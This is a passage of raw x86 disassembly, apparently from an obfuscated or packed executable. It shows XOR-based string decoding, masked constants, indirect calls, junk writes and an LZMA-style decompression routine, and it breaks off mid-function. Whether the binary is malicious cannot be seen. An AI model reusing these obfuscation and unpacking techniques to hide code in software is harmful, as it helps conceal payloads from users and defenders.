  416658:	mov    BYTE PTR [ebp-0x1b],0x4e
  41665c:	mov    BYTE PTR [ebp-0x1a],0x7c
  416660:	mov    BYTE PTR [ebp-0x28],0xf
  416664:	mov    BYTE PTR [ebp-0x27],0x4
  416668:	mov    BYTE PTR [ebp-0x26],0x0
  41666c:	mov    BYTE PTR [ebp-0x25],0xb
  416670:	mov    BYTE PTR [ebp-0x24],0x1d
  416674:	mov    BYTE PTR [ebp-0x23],0xc
  416678:	push   esi
  416679:	mov    BYTE PTR [ebp-0x22],0x5
  41667d:	mov    BYTE PTR [ebp-0x21],0x7c
  416681:	xor    esi,esi
  416683:	mov    eax,0xf8
  416688:	lea    ecx,[ebp+esi*1-0x18]
  41668c:	movzx  edx,BYTE PTR [ecx]
  41668f:	xor    edx,0x74
  416692:	add    edx,eax
  416694:	inc    esi
  416695:	mov    BYTE PTR [ecx],dl
  416697:	cmp    esi,0x6
  41669a:	jb     0x416688
  41669c:	xor    esi,esi
  41669e:	lea    ecx,[ebp+esi*1-0x20]
  4166a2:	movzx  edx,BYTE PTR [ecx]
  4166a5:	xor    edx,0x74
  4166a8:	add    edx,eax
  4166aa:	inc    esi
  4166ab:	mov    BYTE PTR [ecx],dl
  4166ad:	cmp    esi,0x7
  4166b0:	jb     0x41669e
  4166b2:	xor    esi,esi
  4166b4:	lea    ecx,[ebp+esi*1-0x28]
  4166b8:	movzx  edx,BYTE PTR [ecx]
  4166bb:	xor    edx,0x74
  4166be:	add    edx,eax
  4166c0:	inc    esi
  4166c1:	mov    BYTE PTR [ecx],dl
  4166c3:	cmp    esi,0x8
  4166c6:	jb     0x4166b4
  4166c8:	lea    eax,[ebp-0x2c]
  4166cb:	mov    DWORD PTR [ebp-0x8],eax
  4166ce:	mov    ecx,DWORD PTR [ebp-0x8]
  4166d1:	mov    eax,0x7113fcef
  4166d6:	mov    DWORD PTR [ecx],eax
  4166d8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4166db:	push   edi
  4166dc:	mov    esi,0x4e22
  4166e1:	mov    ebx,0x3272e2
  4166e6:	cmp    ecx,eax
  4166e8:	jne    0x4167b3
  4166ee:	lea    eax,[esi+0x53]
  4166f1:	mov    WORD PTR [ebp-0x78],ax
  4166f5:	mov    eax,esi
  4166f7:	mov    WORD PTR [ebp-0x76],ax
  4166fb:	add    eax,0x5d
  4166fe:	mov    WORD PTR [ebp-0x74],ax
  416702:	lea    eax,[esi+0x1a]
  416705:	mov    WORD PTR [ebp-0x72],ax
  416709:	add    eax,0x41
  41670c:	mov    ecx,eax
  41670e:	lea    eax,[esi+0x15]
  416711:	mov    WORD PTR [ebp-0x66],ax
  416715:	mov    eax,esi
  416717:	mov    WORD PTR [ebp-0x64],ax
  41671b:	add    eax,0x14
  41671e:	mov    WORD PTR [ebp-0x62],ax
  416722:	mov    eax,0x469
  416727:	mov    WORD PTR [ebp-0x60],ax
  41672b:	mov    eax,0x5678
  416730:	mov    WORD PTR [ebp-0x5e],ax
  416734:	mov    eax,0x6118
  416739:	mov    WORD PTR [ebp-0x5c],ax
  41673d:	lea    eax,[ebp-0xe0]
  416743:	push   eax
  416744:	mov    eax,DWORD PTR [ebp+0xc]
  416747:	mov    edi,0x751089b
  41674c:	xor    eax,edi
  41674e:	add    eax,ebx
  416750:	push   eax
  416751:	mov    WORD PTR [ebp-0x70],cx
  416755:	lea    ecx,[esi+0x16]
  416758:	mov    edx,ecx
  41675a:	lea    eax,[ebp-0x78]
  41675d:	push   eax
  41675e:	mov    eax,DWORD PTR [ebp-0x4]
  416761:	mov    eax,DWORD PTR [eax+0x198]
  416767:	mov    WORD PTR [ebp-0x6e],dx
  41676b:	mov    edx,0x4f96
  416770:	mov    WORD PTR [ebp-0x6c],dx
  416774:	mov    DWORD PTR [ebp-0x6a],0x4e7d4e3b
  41677b:	mov    DWORD PTR [ebp-0x5a],0x4e38f10a
  416782:	mov    DWORD PTR [ebp-0xe0],0x1
  41678c:	mov    DWORD PTR [ebp-0xdc],0x255
  416796:	push   DWORD PTR [eax]
  416798:	mov    eax,DWORD PTR [ebp+0x10]
  41679b:	call   eax
  41679d:	mov    DWORD PTR [ebp-0x8],eax
  4167a0:	mov    eax,DWORD PTR [ebp-0x8]
  4167a3:	test   eax,eax
  4167a5:	je     0x4167b8
  4167a7:	xor    DWORD PTR ds:0x76586876,0x87687666
  4167b1:	jmp    0x4167b8
  4167b3:	mov    edi,0x751089b
  4167b8:	mov    eax,DWORD PTR [ebp-0x4]
  4167bb:	mov    ecx,DWORD PTR [eax+0x18c]
  4167c1:	xor    eax,eax
  4167c3:	cmp    DWORD PTR [ecx],eax
  4167c5:	jne    0x416a30
  4167cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4167ce:	mov    ecx,DWORD PTR [ecx+0x17c]
  4167d4:	mov    DWORD PTR [ecx],eax
  4167d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4167d9:	mov    ecx,DWORD PTR [ecx+0x180]
  4167df:	mov    DWORD PTR [ecx],eax
  4167e1:	mov    eax,0x4f8f
  4167e6:	mov    WORD PTR [ebp-0x9c],ax
  4167ed:	mov    eax,esi
  4167ef:	mov    WORD PTR [ebp-0x9a],ax
  4167f6:	mov    eax,0x4e7f
  4167fb:	mov    WORD PTR [ebp-0x98],ax
  416802:	add    eax,0xffffffc0
  416805:	mov    WORD PTR [ebp-0x96],ax
  41680c:	mov    eax,0x4f92
  416811:	mov    WORD PTR [ebp-0x94],ax
  416818:	mov    eax,0x4e3e
  41681d:	mov    WORD PTR [ebp-0x92],ax
  416824:	add    eax,0x3f
  416827:	mov    WORD PTR [ebp-0x90],ax
  41682e:	mov    eax,0x4e38
  416833:	mov    WORD PTR [ebp-0x8e],ax
  41683a:	mov    eax,esi
  41683c:	mov    WORD PTR [ebp-0x8c],ax
  416843:	mov    eax,0x4e3b
  416848:	mov    WORD PTR [ebp-0x8a],ax
  41684f:	mov    eax,0x99ff
  416854:	mov    WORD PTR [ebp-0x88],ax
  41685b:	mov    eax,0x828e
  416860:	mov    WORD PTR [ebp-0x86],ax
  416867:	mov    eax,0xd78d
  41686c:	mov    WORD PTR [ebp-0x84],ax
  416873:	add    eax,0x1c
  416876:	mov    WORD PTR [ebp-0x82],ax
  41687d:	mov    eax,0x27a8
  416882:	mov    WORD PTR [ebp-0x80],ax
  416886:	mov    eax,0x47a8
  41688b:	mov    WORD PTR [ebp-0x7e],ax
  41688f:	mov    eax,0x4e39
  416894:	push   0x8
  416896:	mov    WORD PTR [ebp-0x7c],ax
  41689a:	mov    DWORD PTR [ebp-0x10],0xb00040f
  4168a1:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  4168a8:	lea    eax,[ebp-0x10]
  4168ab:	pop    ecx
  4168ac:	mov    dl,BYTE PTR [eax]
  4168ae:	xor    dl,0x74
  4168b1:	sub    dl,0x8
  4168b4:	mov    BYTE PTR [eax],dl
  4168b6:	inc    eax
  4168b7:	dec    ecx
  4168b8:	jne    0x4168ac
  4168ba:	lea    eax,[ebp-0x10]
  4168bd:	mov    DWORD PTR [ebp-0xdc],eax
  4168c3:	lea    eax,[ebp-0xe0]
  4168c9:	push   eax
  4168ca:	mov    eax,DWORD PTR [ebp+0xc]
  4168cd:	xor    eax,edi
  4168cf:	add    eax,ebx
  4168d1:	push   eax
  4168d2:	mov    eax,DWORD PTR [ebp-0x4]
  4168d5:	add    eax,0x66
  4168d8:	push   eax
  4168d9:	mov    eax,DWORD PTR [ebp-0x4]
  4168dc:	mov    eax,DWORD PTR [eax+0x198]
  4168e2:	mov    DWORD PTR [ebp-0xe0],0x1
  4168ec:	push   DWORD PTR [eax]
  4168ee:	mov    eax,DWORD PTR [ebp+0x10]
  4168f1:	call   eax
  4168f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4168f6:	xor    ecx,edi
  4168f8:	add    ecx,ebx
  4168fa:	mov    DWORD PTR [ebp-0x8],eax
  4168fd:	cmp    eax,ecx
  4168ff:	jne    0x41691a
  416901:	mov    eax,ds:0x33730bee
  416906:	or     eax,0x22150bef
  41690b:	mov    ds:0x33730bee,eax
  416910:	add    eax,0x3372e90f
  416915:	mov    ds:0x33730bee,eax
  41691a:	mov    ecx,0x4f8a
  41691f:	mov    eax,ecx
  416921:	mov    WORD PTR [ebp-0x40],ax
  416925:	mov    eax,0x4e71
  41692a:	mov    edx,eax
  41692c:	mov    WORD PTR [ebp-0x3e],dx
  416930:	lea    edx,[ecx+0xf]
  416933:	mov    WORD PTR [ebp-0x3c],dx
  416937:	add    edx,0xfffffff8
  41693a:	mov    WORD PTR [ebp-0x3a],dx
  41693e:	lea    edx,[ecx+0x9]
  416941:	mov    WORD PTR [ebp-0x38],dx
  416945:	add    edx,0x19
  416948:	mov    WORD PTR [ebp-0x36],dx
  41694c:	lea    edx,[ecx+0x1b]
  41694f:	mov    WORD PTR [ebp-0x34],dx
  416953:	mov    WORD PTR [ebp-0x32],cx
  416957:	mov    ecx,esi
  416959:	mov    WORD PTR [ebp-0x30],cx
  41695d:	lea    ecx,[edx+0x5]
  416960:	mov    edx,ecx
  416962:	mov    WORD PTR [ebp-0x54],dx
  416966:	mov    edx,eax
  416968:	mov    WORD PTR [ebp-0x52],dx
  41696c:	add    edx,0x8
  41696f:	mov    WORD PTR [ebp-0x50],dx
  416973:	mov    WORD PTR [ebp-0x4e],ax
  416977:	add    eax,0x2
  41697a:	mov    WORD PTR [ebp-0x4c],ax
  41697e:	lea    eax,[ecx-0x1e]
  416981:	mov    WORD PTR [ebp-0x4a],ax
  416985:	add    eax,0xfffffff9
  416988:	mov    WORD PTR [ebp-0x48],ax
  41698c:	mov    WORD PTR [ebp-0x46],cx
  416990:	mov    WORD PTR [ebp-0x44],si
  416994:	mov    eax,DWORD PTR [ebp+0x8]
  416997:	movzx  ecx,WORD PTR [ebp-0x54]
  41699b:	xor    eax,edi
  41699d:	add    eax,ebx
  41699f:	xor    eax,ecx
  4169a1:	mov    WORD PTR [ebp-0x54],ax
  4169a5:	mov    eax,DWORD PTR [ebp+0x8]
  4169a8:	movzx  ecx,WORD PTR [ebp-0x40]
  4169ac:	xor    eax,edi
  4169ae:	add    eax,ebx
  4169b0:	xor    eax,ecx
  4169b2:	mov    WORD PTR [ebp-0x40],ax
  4169b6:	xor    eax,eax
  4169b8:	mov    WORD PTR [ebp-0xf4],ax
  4169bf:	mov    WORD PTR [ebp-0x108],ax
  4169c6:	mov    edi,DWORD PTR [ebp+0x24]
  4169c9:	lea    eax,[ebp-0xf4]
  4169cf:	lea    edx,[ebp-0x54]
  4169d2:	mov    DWORD PTR [ebp-0xe0],0x2
  4169dc:	mov    DWORD PTR [ebp-0xdc],eax
  4169e2:	call   0x419373
  4169e7:	mov    DWORD PTR [ebp-0xd8],eax
  4169ed:	lea    eax,[ebp-0xe0]
  4169f3:	push   eax
  4169f4:	mov    eax,DWORD PTR [ebp+0xc]
  4169f7:	xor    eax,0x751089b
  4169fc:	add    eax,ebx
  4169fe:	push   eax
  4169ff:	lea    eax,[ebp-0x9c]
  416a05:	push   eax
  416a06:	push   DWORD PTR [ebp-0x8]
  416a09:	mov    eax,DWORD PTR [ebp+0x10]
  416a0c:	call   eax
  416a0e:	mov    edi,DWORD PTR [ebp+0x24]
  416a11:	lea    eax,[ebp-0x108]
  416a17:	lea    edx,[ebp-0x40]
  416a1a:	mov    DWORD PTR [ebp-0xdc],eax
  416a20:	call   0x419373
  416a25:	mov    DWORD PTR [ebp-0xd8],eax
  416a2b:	mov    edi,0x751089b
  416a30:	mov    eax,DWORD PTR [ebp+0x14]
  416a33:	push   DWORD PTR [ebp-0x4]
  416a36:	push   DWORD PTR [ebp+0x20]
  416a39:	push   DWORD PTR [ebp+0x1c]
  416a3c:	push   DWORD PTR [ebp+0x18]
  416a3f:	push   DWORD PTR [ebp+0x10]
  416a42:	push   DWORD PTR [ebp+0x8]
  416a45:	push   DWORD PTR [ebp+0xc]
  416a48:	call   0x417bef
  416a4d:	test   eax,eax
  416a4f:	je     0x416a93
  416a51:	add    DWORD PTR [ebp-0x4],eax
  416a54:	push   DWORD PTR [ebp-0x4]
  416a57:	lea    esi,[ebp+0x4]
  416a5a:	call   0x416e83
  416a5f:	mov    eax,DWORD PTR [ebp-0x4]
  416a62:	mov    eax,DWORD PTR [eax+0x1c8]
  416a68:	mov    eax,DWORD PTR [eax]
  416a6a:	xor    eax,edi
  416a6c:	add    eax,ebx
  416a6e:	mov    eax,DWORD PTR [ebp-0x4]
  416a71:	jne    0x416a89
  416a73:	mov    ecx,DWORD PTR [ebp-0x4]
  416a76:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416a7c:	push   DWORD PTR [ecx]
  416a7e:	mov    eax,DWORD PTR [eax+0x1d8]
  416a84:	call   DWORD PTR [eax+0x28]
  416a87:	jmp    0x416a93
  416a89:	mov    eax,DWORD PTR [eax+0x17c]
  416a8f:	mov    eax,DWORD PTR [eax]
  416a91:	add    DWORD PTR [esi],eax
  416a93:	pop    edi
  416a94:	pop    esi
  416a95:	pop    ebx
  416a96:	leave  
  416a97:	ret    0x20
  416a9a:	push   edi
  416a9b:	push   esi
  416a9c:	push   ebx
  416a9d:	push   ebp
  416a9e:	mov    ebp,esp
  416aa0:	mov    eax,DWORD PTR [ebp+0x24]
  416aa3:	add    DWORD PTR [ebp+0x28],eax
  416aa6:	push   eax
  416aa7:	cld    
  416aa8:	mov    esi,DWORD PTR [ebp+0x18]
  416aab:	add    DWORD PTR [ebp+0x1c],esi
  416aae:	push   esi
  416aaf:	mov    esi,DWORD PTR [ebp+0x14]
  416ab2:	lods   eax,DWORD PTR ds:[esi]
  416ab3:	xchg   edx,eax
  416ab4:	push   edx
  416ab5:	mov    cl,BYTE PTR [esi-0x2]
  416ab8:	or     eax,0xffffffff
  416abb:	shl    eax,cl
  416abd:	not    eax
  416abf:	push   eax
  416ac0:	mov    cl,dh
  416ac2:	or     eax,0xffffffff
  416ac5:	shl    eax,cl
  416ac7:	not    eax
  416ac9:	push   eax
  416aca:	add    cl,dl
  416acc:	mov    edi,esi
  416ace:	sub    esp,0xc
  416ad1:	sub    eax,eax
  416ad3:	inc    eax
  416ad4:	push   eax
  416ad5:	push   eax
  416ad6:	push   eax
  416ad7:	push   eax
  416ad8:	push   eax
  416ad9:	push   edi
  416ada:	sub    esi,esi
  416adc:	push   esi
  416add:	or     ebx,0xffffffff
  416ae0:	mov    eax,0x300
  416ae5:	shl    eax,cl
  416ae7:	lea    ecx,[eax+0x736]
  416aed:	mov    eax,0x4000400
  416af2:	shr    ecx,1
  416af4:	rep stos DWORD PTR es:[edi],eax
  416af6:	push   0x5
  416af8:	pop    ecx
  416af9:	call   0x416de4
  416afe:	loop   0x416af9
  416b00:	lea    esi,[esi]
  416b02:	lea    edi,[edi]
  416b04:	mov    edi,DWORD PTR [ebp-0x4]
  416b07:	mov    eax,DWORD PTR [ebp-0x10]
  416b0a:	sub    edi,DWORD PTR [ebp+0x24]
  416b0d:	and    eax,edi
  416b0f:	mov    DWORD PTR [ebp-0x18],eax
  416b12:	mov    al,0x0
  416b14:	call   0x416dfc
  416b19:	jne    0x416bb4
  416b1f:	mov    cl,BYTE PTR [ebp-0xc]
  416b22:	and    edi,DWORD PTR [ebp-0x14]
  416b25:	shl    edi,cl
  416b27:	sub    cl,0x8
  416b2a:	neg    cl
  416b2c:	shr    esi,cl
  416b2e:	pop    eax
  416b2f:	add    edi,esi
  416b31:	pop    esi
  416b32:	lea    edi,[edi+edi*2]
  416b35:	shl    edi,0x8
  416b38:	cmp    al,0x7
  416b3a:	pop    edx
  416b3b:	lea    ecx,[esi+edi*2+0xe6c]
  416b42:	push   ecx
  416b43:	push   esi
  416b44:	mov    esi,0x100
  416b49:	push   eax
  416b4a:	mov    al,0x1
  416b4c:	jb     0x416b82
  416b4e:	mov    edi,DWORD PTR [ebp-0x4]
  416b51:	sub    edi,DWORD PTR [ebp-0x24]
  416b54:	movzx  edi,BYTE PTR [edi]
  416b57:	mov    ebp,DWORD PTR [ebp-0x34]
  416b5a:	shl    edi,1
  416b5c:	mov    ecx,esi
  416b5e:	and    esi,edi
  416b60:	add    ecx,esi
  416b62:	lea    ebp,[ebp+ecx*2+0x0]
  416b66:	call   0x416e1b
  416b6b:	mov    ecx,eax
  416b6d:	shr    esi,0x8
  416b70:	and    ecx,0x1
  416b73:	cmp    esi,ecx
  416b75:	mov    esi,0x100
  416b7a:	jne    0x416b8a
  416b7c:	cmp    eax,esi
  416b7e:	jb     0x416b57
  416b80:	jmp    0x416b96
  416b82:	mov    ebp,DWORD PTR [ebp-0x34]
  416b85:	call   0x416e1b
  416b8a:	inc    eax
  416b8b:	inc    esi
  416b8c:	sub    eax,0x1
  416b8f:	sub    esi,0x1
  416b92:	cmp    eax,esi
  416b94:	jb     0x416b82
  416b96:	pop    edx
  416b97:	inc    edx
  416b98:	cmp    edx,0x5
  416b9b:	dec    edx
  416b9c:	mov    ecx,edx
  416b9e:	jb     0x416baf
  416ba0:	inc    edx
  416ba1:	cmp    edx,0xb
  416ba4:	dec    edx
  416ba5:	mov    cl,0x4
  416ba7:	dec    cl
  416ba9:	jb     0x416baf
  416bab:	mov    cl,0x7
  416bad:	dec    cl
  416baf:	sub    edx,ecx
  416bb1:	push   edx
  416bb2:	jmp    0x416c03
  416bb4:	mov    al,0xc1
  416bb6:	dec    al
  416bb8:	call   0x416e0c
  416bbd:	jne    0x416bd3
  416bbf:	pop    eax
  416bc0:	pop    edi
  416bc1:	pop    edx
  416bc2:	pop    ecx
  416bc3:	pop    edx
  416bc4:	pop    ecx
  416bc5:	push   DWORD PTR [esp]
  416bc8:	push   ecx
  416bc9:	push   edx
  416bca:	mov    edx,0x664
  416bcf:	mov    cl,0x0
  416bd1:	jmp    0x416c46
  416bd3:	mov    al,0xcd
  416bd5:	dec    al
  416bd7:	call   0x416e0c
  416bdc:	jne    0x416c0c
  416bde:	mov    al,0xf1
  416be0:	dec    al
  416be2:	call   0x416dfc
  416be7:	jne    0x416c3c
  416be9:	pop    eax
  416bea:	cmp    al,0x7
  416bec:	mov    al,0x9
  416bee:	jb     0x416bf2
  416bf0:	mov    al,0xb
  416bf2:	push   eax
  416bf3:	mov    esi,DWORD PTR [ebp-0x4]
  416bf6:	sub    esi,DWORD PTR [ebp-0x24]
  416bf9:	cmp    esi,DWORD PTR [ebp+0x24]
  416bfc:	jb     0x416dd3
  416c02:	lods   al,BYTE PTR ds:[esi]
  416c03:	mov    edi,DWORD PTR [ebp-0x4]
  416c06:	stos   BYTE PTR es:[edi],al
  416c07:	jmp    0x416d9a
  416c0c:	mov    al,0xd8
  416c0e:	call   0x416e0c
  416c13:	mov    esi,DWORD PTR [ebp-0x28]
  416c16:	je     0x416c33
  416c18:	mov    al,0xe4
  416c1a:	call   0x416e0c
  416c1f:	mov    esi,DWORD PTR [ebp-0x2c]
  416c22:	je     0x416c2d
  416c24:	mov    esi,DWORD PTR [ebp-0x30]
  416c27:	mov    ecx,DWORD PTR [ebp-0x2c]
  416c2a:	mov    DWORD PTR [ebp-0x30],ecx
  416c2d:	mov    ecx,DWORD PTR [ebp-0x28]
  416c30:	mov    DWORD PTR [ebp-0x2c],ecx
  416c33:	mov    ecx,DWORD PTR [ebp-0x24]
  416c36:	mov    DWORD PTR [ebp-0x28],ecx
  416c39:	mov    DWORD PTR [ebp-0x24],esi
  416c3c:	pop    eax
  416c3d:	pop    edi
  416c3e:	pop    ecx
  416c3f:	mov    edx,0xa68
  416c44:	mov    cl,0x8
  416c46:	add    edx,edi
  416c48:	push   edx
  416c49:	push   edi
  416c4a:	cmp    al,0x7
  416c4c:	mov    al,cl
  416c4e:	jb     0x416c52
  416c50:	add    al,0x3
  416c52:	push   eax
  416c53:	mov    ebp,DWORD PTR [ebp-0x34]
  416c56:	call   0x416e19
  416c5b:	jne    0x416c71
  416c5d:	mov    eax,DWORD PTR [ebp-0x18]
  416c60:	mov    edi,DWORD PTR [ebp-0x34]
  416c63:	shl    eax,0x3
  416c66:	sub    ecx,ecx
  416c68:	push   0x8
  416c6a:	pop    esi
  416c6b:	lea    edi,[edi+eax*2+0x4]
  416c6f:	jmp    0x416ca6
  416c71:	mov    ebp,DWORD PTR [ebp-0x34]
  416c74:	add    ebp,0x2
  416c77:	call   0x416e19
  416c7c:	jne    0x416c96
  416c7e:	mov    eax,DWORD PTR [ebp-0x18]
  416c81:	mov    edi,DWORD PTR [ebp-0x34]
  416c84:	shl    eax,0x3
  416c87:	push   0x8
  416c89:	pop    ecx
  416c8a:	push   0x8
  416c8c:	pop    esi
  416c8d:	lea    edi,[edi+eax*2+0x104]
  416c94:	jmp    0x416ca6
  416c96:	mov    edi,0x204
  416c9b:	add    edi,DWORD PTR [ebp-0x34]
  416c9e:	push   0x10
  416ca0:	pop    ecx
  416ca1:	mov    esi,0x100
  416ca6:	mov    DWORD PTR [ebp-0x1c],ecx
  416ca9:	sub    eax,eax
  416cab:	inc    eax
  416cac:	mov    ebp,edi
  416cae:	call   0x416e1b
  416cb3:	mov    ecx,eax
  416cb5:	sub    ecx,esi
  416cb7:	jb     0x416cac
  416cb9:	add    DWORD PTR [ebp-0x1c],ecx
  416cbc:	cmp    DWORD PTR [ebp-0x3c],0x4
  416cc0:	jae    0x416d76
  416cc6:	add    DWORD PTR [ebp-0x3c],0x7
  416cca:	mov    ecx,DWORD PTR [ebp-0x1c]
  416ccd:	cmp    ecx,0x4
  416cd0:	jb     0x416cd5
  416cd2:	push   0x3
  416cd4:	pop    ecx
  416cd5:	mov    edi,DWORD PTR [ebp-0x38]
  416cd8:	shl    ecx,0x6
  416cdb:	sub    eax,eax
  416cdd:	inc    eax
  416cde:	push   0x40
  416ce0:	pop    esi
  416ce1:	lea    edi,[edi+ecx*2+0x360]
  416ce8:	mov    ebp,edi
  416cea:	call   0x416e1b
  416cef:	mov    ecx,eax
  416cf1:	sub    ecx,esi
  416cf3:	jb     0x416ce8
  416cf5:	mov    DWORD PTR [ebp-0x18],ecx
  416cf8:	mov    DWORD PTR [ebp-0x24],ecx
  416cfb:	cmp    ecx,0x4
  416cfe:	jb     0x416d73
  416d00:	mov    esi,ecx
  416d02:	and    DWORD PTR [ebp-0x24],0x1
  416d06:	shr    esi,1
  416d08:	or     DWORD PTR [ebp-0x24],0x2
  416d0c:	dec    esi
  416d0d:	cmp    ecx,0xe
  416d10:	jae    0x416d2b
  416d12:	mov    eax,0x2af
  416d17:	sub    eax,ecx
  416d19:	mov    ecx,esi
  416d1b:	shl    BYTE PTR [ebp-0x24],cl
  416d1e:	add    eax,DWORD PTR [ebp-0x24]
  416d21:	shl    eax,1
  416d23:	add    eax,DWORD PTR [ebp-0x38]
  416d26:	mov    DWORD PTR [ebp-0x34],eax
  416d29:	jmp    0x416d58
  416d2b:	sub    esi,0x4
  416d2e:	call   0x416dd8
  416d33:	shr    ebx,1
  416d35:	shl    DWORD PTR [ebp-0x24],1
  416d38:	cmp    DWORD PTR [ebp-0x20],ebx
  416d3b:	jb     0x416d43
  416d3d:	inc    DWORD PTR [ebp-0x24]
  416d40:	sub    DWORD PTR [ebp-0x20],ebx
  416d43:	dec    esi
  416d44:	jne    0x416d2e
  416d46:	mov    eax,0x644
  416d4b:	add    eax,DWORD PTR [ebp-0x38]
  416d4e:	mov    DWORD PTR [ebp-0x34],eax
  416d51:	shl    DWORD PTR [ebp-0x24],0x4
  416d55:	push   0x4
  416d57:	pop    esi
  416d58:	sub    edi,edi
  416d5a:	inc    edi
  416d5b:	mov    eax,edi
  416d5d:	mov    ebp,DWORD PTR [ebp-0x34]
  416d60:	call   0x416e1b
  416d65:	test   al,0x1
  416d67:	je     0x416d6c
  416d69:	or     DWORD PTR [ebp-0x24],edi
  416d6c:	shl    edi,1
  416d6e:	dec    esi
  416d6f:	jne    0x416d5d
  416d71:	jmp    0x416d73
  416d73:	inc    DWORD PTR [ebp-0x24]
  416d76:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d79:	add    ecx,0x2
  416d7c:	mov    edi,DWORD PTR [ebp-0x4]
  416d7f:	mov    eax,edi
  416d81:	sub    eax,DWORD PTR [ebp+0x24]
  416d84:	cmp    DWORD PTR [ebp-0x24],eax
  416d87:	ja     0x416dd3
  416d89:	mov    esi,edi
  416d8b:	sub    esi,DWORD PTR [ebp-0x24]
  416d8e:	mov    edx,DWORD PTR [ebp+0x28]
  416d91:	lods   al,BYTE PTR ds:[esi]
  416d92:	stos   BYTE PTR es:[edi],al
  416d93:	cmp    edi,edx
  416d95:	jae    0x416d9a
  416d97:	dec    ecx
  416d98:	jne    0x416d91
  416d9a:	mov    DWORD PTR [ebp-0x4],edi
  416d9d:	movzx  esi,al
  416da0:	cmp    edi,DWORD PTR [ebp+0x28]
  416da3:	jb     0x416b04
  416da9:	call   0x416dd8
  416dae:	sub    eax,eax
  416db0:	lea    ebp,[esp+0x3c]
  416db4:	mov    edx,DWORD PTR [ebp+0x20]
  416db7:	mov    esi,DWORD PTR [ebp-0x8]
  416dba:	sub    esi,DWORD PTR [ebp+0x18]
  416dbd:	mov    DWORD PTR [edx],esi
  416dbf:	mov    edx,DWORD PTR [ebp+0x2c]
  416dc2:	mov    edi,DWORD PTR [ebp-0x4]
  416dc5:	sub    edi,DWORD PTR [ebp+0x24]
  416dc8:	mov    DWORD PTR [edx],edi
  416dca:	leave  
  416dcb:	pop    ebx
  416dcc:	pop    esi
  416dcd:	pop    edi
  416dce:	ret    0x1c
  416dd1:	pop    esi
  416dd2:	pop    eax
  416dd3:	sub    eax,eax
  416dd5:	inc    eax
  416dd6:	jmp    0x416db0
  416dd8:	cmp    ebx,0x1000000
  416dde:	jb     0x416de1
  416de0:	ret    
  416de1:	shl    ebx,0x8
  416de4:	push   esi
  416de5:	mov    esi,DWORD PTR [ebp-0x8]
  416de8:	cmp    esi,DWORD PTR [ebp+0x1c]
  416deb:	jae    0x416dd1
  416ded:	mov    eax,DWORD PTR [ebp-0x20]
  416df0:	shl    eax,0x8
  416df3:	lods   al,BYTE PTR ds:[esi]
  416df4:	mov    DWORD PTR [ebp-0x20],eax
  416df7:	mov    DWORD PTR [ebp-0x8],esi
  416dfa:	pop    esi
  416dfb:	ret    
  416dfc:	mov    ecx,DWORD PTR [ebp-0x3c]
  416dff:	movzx  eax,al
  416e02:	shl    ecx,0x4
  416e05:	add    eax,DWORD PTR [ebp-0x18]
  416e08:	add    eax,ecx
  416e0a:	jmp    0x416e12
  416e0c:	movzx  eax,al
  416e0f:	add    eax,DWORD PTR [ebp-0x3c]
  416e12:	mov    ebp,DWORD PTR [ebp-0x38]
  416e15:	lea    ebp,[ebp+eax*2+0x0]
  416e19:	sub    eax,eax
  416e1b:	lea    ebp,[ebp+eax*2+0x0]
  416e1f:	cmp    ebx,0x1000000
  416e25:	jae    0x416e43
  416e27:	mov    ecx,DWORD PTR [esp+0x38]
  416e2b:	shl    DWORD PTR [esp+0x20],0x8
  416e30:	cmp    ecx,DWORD PTR [esp+0x5c]
  416e34:	jae    0x416dd2
  416e36:	mov    dl,BYTE PTR [ecx]
  416e38:	inc    DWORD PTR [esp+0x38]
  416e3c:	shl    ebx,0x8
  416e3f:	mov    BYTE PTR [esp+0x20],dl
  416e43:	mov    ecx,ebx
  416e45:	movzx  edx,WORD PTR [ebp+0x0]
  416e49:	shr    ecx,0xb
  416e4c:	imul   ecx,edx
  416e4f:	cmp    DWORD PTR [esp+0x20],ecx
  416e53:	jae    0x416e6c
  416e55:	mov    ebx,ecx
  416e57:	mov    ecx,0x800
  416e5c:	sub    ecx,edx
  416e5e:	shr    ecx,0x5
  416e61:	add    WORD PTR [ebp+0x0],cx
  416e65:	add    eax,eax
  416e67:	lea    ebp,[esp+0x40]
  416e6b:	ret    
  416e6c:	shr    edx,0x5
  416e6f:	sub    DWORD PTR [esp+0x20],ecx
  416e73:	sub    ebx,ecx
  416e75:	sub    WORD PTR [ebp+0x0],dx
  416e79:	add    eax,eax
  416e7b:	add    eax,0x1
  416e7e:	lea    ebp,[esp+0x40]
  416e82:	ret    
  416e83:	push   ebp
  416e84:	mov    ebp,esp
  416e86:	sub    esp,0x104
  416e8c:	push   ebx
  416e8d:	push   esi
  416e8e:	push   edi
  416e8f:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  416e96:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  416e9d:	mov    eax,DWORD PTR [ebp+0x8]
  416ea0:	mov    DWORD PTR [ebp+0x8],eax
  416ea3:	mov    ecx,DWORD PTR [ebp-0x14]
  416ea6:	mov    ebx,0x751089b
  416eab:	xor    ecx,ebx
  416ead:	mov    eax,0x3272e2
  416eb2:	add    ecx,eax
  416eb4:	mov    DWORD PTR [ebp-0x2c],ecx
  416eb7:	mov    ecx,DWORD PTR [ebp-0x14]
  416eba:	xor    ecx,ebx
  416ebc:	add    ecx,eax
  416ebe:	mov    DWORD PTR [ebp-0x3c],ecx
  416ec1:	mov    ecx,DWORD PTR [ebp-0x14]
  416ec4:	xor    ecx,ebx
  416ec6:	add    ecx,eax
  416ec8:	mov    DWORD PTR [ebp-0x40],ecx
  416ecb:	mov    ecx,DWORD PTR [ebp-0x14]
  416ece:	xor    ecx,ebx
  416ed0:	add    ecx,eax
  416ed2:	mov    DWORD PTR [ebp-0xa0],ecx
  416ed8:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  416edf:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  416ee6:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  416eed:	push   0x25
  416eef:	pop    ecx
  416ef0:	mov    DWORD PTR [ebp-0x34],ecx
  416ef3:	mov    DWORD PTR [ebp-0x34],ecx
  416ef6:	push   0x65
  416ef8:	pop    ecx
